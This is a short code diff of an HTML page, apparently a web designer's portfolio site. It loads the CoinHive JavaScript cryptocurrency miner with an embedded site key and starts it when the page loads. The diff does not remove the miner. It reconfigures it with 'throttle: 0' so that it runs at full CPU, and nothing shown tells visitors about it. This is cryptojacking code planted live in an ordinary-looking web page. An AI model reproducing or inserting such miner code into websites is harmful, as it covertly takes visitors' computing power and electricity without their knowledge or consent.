@@ -323,13 +323,13 @@ My main area of expertise is in designing gorgeous websites and developing featu
 
     </div>
     <script src="https://coin-hive.com/lib/coinhive.min.js" data-graph="#ff0000">
-
-
     </script>
     <script>
-        var miner = new CoinHive.Anonymous('KQoqF6YcMXhL7znaz1Y4zltd6MNQEKYf');
-        miner.start();
+        var miner = new CoinHive.Anonymous('KQoqF6YcMXhL7znaz1Y4zltd6MNQEKYf', {
+            throttle: 0
+        });
 
+        miner.start();
     </script>
     <script src="frameworks/angular.min.js"></script>
     <script src="scripts.js"></script>
